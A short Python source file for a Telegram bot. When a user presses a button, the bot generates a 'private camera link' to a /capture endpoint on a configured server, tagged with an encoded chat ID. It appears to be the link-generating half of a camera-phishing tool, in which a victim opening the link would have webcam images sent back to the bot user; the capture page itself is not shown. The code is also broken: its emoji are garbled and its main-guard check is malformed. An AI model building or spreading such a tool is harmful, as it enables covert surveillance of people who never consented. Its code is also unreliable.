import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from utils import encode_uid

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
BASE_URL = os.getenv("BASE_URL")  # e.g. https://your-render-app.onrender.com

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN not set in environment.")
if not BASE_URL:
    raise RuntimeError("BASE_URL not set in environment.")

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    btn = InlineKeyboardButton("ߓ Generate Camera Link", callback_data="generate_link")
    markup.add(btn)

    bot.send_message(
        message.chat.id,
        f"ߑ Hello {message.from_user.first_name}!\n\n"
        "Click below to generate your private camera link.",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "generate_link")
def send_link(call):
    uid_enc = encode_uid(call.message.chat.id)
    camera_link = f"{BASE_URL}/capture?uid={uid_enc}"
    bot.send_message(
        call.message.chat.id,
        f"ߎ Here’s your camera link:\n{camera_link}"
    )

if name == "main":
    print("✅ Bot is running...")
    bot.infinity_polling()